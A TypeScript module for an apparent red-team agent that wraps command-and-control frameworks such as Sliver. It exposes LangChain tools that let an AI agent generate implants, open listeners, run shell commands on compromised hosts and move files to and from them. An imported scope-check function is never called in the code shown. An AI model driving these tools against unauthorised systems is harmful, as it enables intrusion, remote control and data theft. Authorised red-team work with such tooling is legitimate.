/**
 * C2 Manager
 *
 * Unified management layer for multiple C2 frameworks.
 * Provides a single interface for listener management, session tracking,
 * implant generation, and task execution across Sliver, Mythic, etc.
 */

import { z } from 'zod';
import { DynamicStructuredTool } from '@langchain/core/tools';
import type { StructuredToolInterface } from '@langchain/core/tools';
import { getRedTeamManager, isRedTeamMode, isTargetInScope } from '../agent/redteam-mode.js';
import { SliverAdapter } from './adapters/sliver-adapter.js';
import type {
  C2Adapter,
  C2Session,
  C2Listener,
  ImplantConfig,
  ImplantPayload,
  C2Task,
  TaskResult,
  ImplantConfigSchema,
  C2TaskSchema,
} from './types.js';

// ============================================================================
// C2 Manager
// ============================================================================

export class C2Manager {
  private adapters: Map<string, C2Adapter> = new Map();
  private activeAdapter: C2Adapter | null = null;
  private sessionCache: Map<string, C2Session> = new Map();

  constructor() {
    // Register available adapters
    this.adapters.set('sliver', new SliverAdapter());
  }

  /**
   * Connect to a C2 framework
   */
  async connect(
    framework: 'sliver' | 'mythic',
    config: Record<string, unknown>
  ): Promise<void> {
    const adapter = this.adapters.get(framework);
    if (!adapter) {
      throw new Error(`Unknown C2 framework: ${framework}. Available: ${Array.from(this.adapters.keys()).join(', ')}`);
    }

    await adapter.connect(config);
    this.activeAdapter = adapter;

    // Set up session event handlers
    adapter.onSessionCreated((session) => {
      this.sessionCache.set(session.id, session);

      if (isRedTeamMode()) {
        getRedTeamManager().addAuditEntry({
          action: `New C2 session established: ${session.hostname}`,
          category: 'c2',
          target: session.remoteAddress,
          details: {
            sessionId: session.id,
            hostname: session.hostname,
            username: session.username,
            os: session.os,
            isAdmin: session.isAdmin,
          },
          result: 'success',
          riskLevel: 'critical',
        });
        getRedTeamManager().incrementStat('sessionsEstablished');
      }
    });

    adapter.onSessionLost((sessionId) => {
      this.sessionCache.delete(sessionId);
    });

    // Audit log
    if (isRedTeamMode()) {
      getRedTeamManager().addAuditEntry({
        action: `Connected to ${framework} C2 framework`,
        category: 'c2',
        details: { framework },
        result: 'success',
        riskLevel: 'high',
      });
    }
  }

  /**
   * Disconnect from the active C2 framework
   */
  async disconnect(): Promise<void> {
    if (this.activeAdapter) {
      await this.activeAdapter.disconnect();
      this.activeAdapter = null;
      this.sessionCache.clear();
    }
  }

  /**
   * Check if connected to a C2 framework
   */
  isConnected(): boolean {
    return this.activeAdapter?.isConnected() ?? false;
  }

  // ============================================================================
  // Listener Management
  // ============================================================================

  async createListener(config: Partial<C2Listener>): Promise<C2Listener> {
    this.ensureConnected();
    const listener = await this.activeAdapter!.createListener(config);

    if (isRedTeamMode()) {
      getRedTeamManager().addAuditEntry({
        action: `Created C2 listener: ${listener.protocol}://${listener.host}:${listener.port}`,
        category: 'c2',
        details: { listenerId: listener.id, protocol: listener.protocol, port: listener.port },
        result: 'success',
        riskLevel: 'high',
      });
    }

    return listener;
  }

  async listListeners(): Promise<C2Listener[]> {
    this.ensureConnected();
    return this.activeAdapter!.listListeners();
  }

  async stopListener(id: string): Promise<void> {
    this.ensureConnected();
    await this.activeAdapter!.stopListener(id);
  }

  // ============================================================================
  // Implant Generation
  // ============================================================================

  async generateImplant(config: ImplantConfig): Promise<ImplantPayload> {
    this.ensureConnected();

    if (isRedTeamMode()) {
      getRedTeamManager().addAuditEntry({
        action: `Generating ${config.type} implant for ${config.os}/${config.arch}`,
        category: 'payload',
        details: {
          name: config.name,
          os: config.os,
          arch: config.arch,
          format: config.format,
          protocol: config.protocol,
          c2: `${config.c2Host}:${config.c2Port}`,
        },
        result: 'pending',
        riskLevel: 'critical',
      });
    }

    return this.activeAdapter!.generateImplant(config);
  }

  // ============================================================================
  // Session Management
  // ============================================================================

  async getSessions(): Promise<C2Session[]> {
    this.ensureConnected();
    const sessions = await this.activeAdapter!.getSessions();

    // Update cache
    for (const session of sessions) {
      this.sessionCache.set(session.id, session);
    }

    return sessions;
  }

  async getSession(id: string): Promise<C2Session | null> {
    this.ensureConnected();
    return this.activeAdapter!.getSession(id);
  }

  async killSession(id: string): Promise<void> {
    this.ensureConnected();
    await this.activeAdapter!.killSession(id);
    this.sessionCache.delete(id);
  }

  /**
   * Interact with a session - execute a command
   */
  async interactSession(sessionId: string, command: string): Promise<TaskResult> {
    return this.executeTask(sessionId, { type: 'shell', command });
  }

  // ============================================================================
  // Task Execution
  // ============================================================================

  async executeTask(sessionId: string, task: C2Task): Promise<TaskResult> {
    this.ensureConnected();

    const session = this.sessionCache.get(sessionId);

    if (isRedTeamMode()) {
      getRedTeamManager().addAuditEntry({
        action: `C2 task: ${task.type}${task.command ? ` (${task.command})` : ''}`,
        category: 'c2',
        target: session?.remoteAddress,
        details: { sessionId, task },
        result: 'pending',
        riskLevel: task.type === 'shell' ? 'high' : 'medium',
      });
    }

    return this.activeAdapter!.executeTask(sessionId, task);
  }

  // ============================================================================
  // LangChain Tools
  // ============================================================================

  /**
   * Create LangChain tools for C2 operations
   */
  createLangChainTools(): StructuredToolInterface[] {
    return [
      new DynamicStructuredTool({
        name: 'c2_sessions',
        description: 'List all active C2 sessions on compromised hosts. Shows hostname, OS, user, and connection info.',
        schema: z.object({}),
        func: async () => {
          if (!this.isConnected()) return 'C2 framework not connected. Use c2_connect first.';
          const sessions = await this.getSessions();
          if (sessions.length === 0) return 'No active sessions.';

          return sessions.map(s =>
            `[${s.id}] ${s.hostname} | ${s.os}/${s.arch} | ${s.username}${s.isAdmin ? ' (ADMIN)' : ''} | ${s.remoteAddress} | ${s.status}`
          ).join('\n');
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_shell',
        description: 'Execute a shell command on a compromised host through an active C2 session.',
        schema: z.object({
          sessionId: z.string().describe('ID of the C2 session to interact with'),
          command: z.string().describe('Shell command to execute on the target'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const result = await this.interactSession(input.sessionId, input.command);
          return result.success ? result.output : `Error: ${result.error}`;
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_create_listener',
        description: 'Create a new C2 listener to accept incoming implant connections.',
        schema: z.object({
          protocol: z.enum(['https', 'mtls', 'dns', 'tcp']).default('https').describe('Listener protocol'),
          host: z.string().default('0.0.0.0').describe('Bind address'),
          port: z.number().default(443).describe('Listen port'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const listener = await this.createListener(input);
          return `Listener created: ${listener.protocol}://${listener.host}:${listener.port} (ID: ${listener.id})`;
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_generate_implant',
        description: 'Generate a C2 implant/agent for deploying on a target system.',
        schema: z.object({
          name: z.string().describe('Name for the implant'),
          os: z.enum(['windows', 'linux', 'macos']).describe('Target operating system'),
          arch: z.enum(['x64', 'x86', 'arm64']).default('x64').describe('Target architecture'),
          type: z.enum(['beacon', 'session']).default('beacon').describe('Implant type'),
          protocol: z.enum(['https', 'mtls', 'dns', 'tcp']).default('https').describe('C2 protocol'),
          c2Host: z.string().describe('C2 callback host'),
          c2Port: z.number().describe('C2 callback port'),
          format: z.enum(['exe', 'dll', 'shellcode', 'shared_lib']).default('exe').describe('Output format'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const payload = await this.generateImplant(input as ImplantConfig);
          return `Implant generated: ${payload.name}${payload.extension} (${payload.sizeBytes} bytes, SHA256: ${payload.sha256})`;
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_process_list',
        description: 'List running processes on a compromised host.',
        schema: z.object({
          sessionId: z.string().describe('C2 session ID'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const result = await this.executeTask(input.sessionId, { type: 'process_list' });
          return result.success ? result.output : `Error: ${result.error}`;
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_upload',
        description: 'Upload a file to a compromised host.',
        schema: z.object({
          sessionId: z.string().describe('C2 session ID'),
          localPath: z.string().describe('Local file path to upload'),
          remotePath: z.string().describe('Destination path on target'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const result = await this.executeTask(input.sessionId, {
            type: 'upload',
            localPath: input.localPath,
            remotePath: input.remotePath,
          });
          return result.success ? `Uploaded to ${input.remotePath}` : `Error: ${result.error}`;
        },
      }),

      new DynamicStructuredTool({
        name: 'c2_download',
        description: 'Download a file from a compromised host.',
        schema: z.object({
          sessionId: z.string().describe('C2 session ID'),
          remotePath: z.string().describe('Remote file path to download'),
        }),
        func: async (input) => {
          if (!this.isConnected()) return 'C2 framework not connected.';
          const result = await this.executeTask(input.sessionId, {
            type: 'download',
            remotePath: input.remotePath,
          });
          return result.success ? result.output : `Error: ${result.error}`;
        },
      }),
    ];
  }

  // ============================================================================
  // Private Helpers
  // ============================================================================

  private ensureConnected(): void {
    if (!this.activeAdapter || !this.activeAdapter.isConnected()) {
      throw new Error('Not connected to any C2 framework. Call connect() first.');
    }
  }
}

// ============================================================================
// Singleton
// ============================================================================

let c2Manager: C2Manager | null = null;

export function getC2Manager(): C2Manager {
  if (!c2Manager) {
    c2Manager = new C2Manager();
  }
  return c2Manager;
}
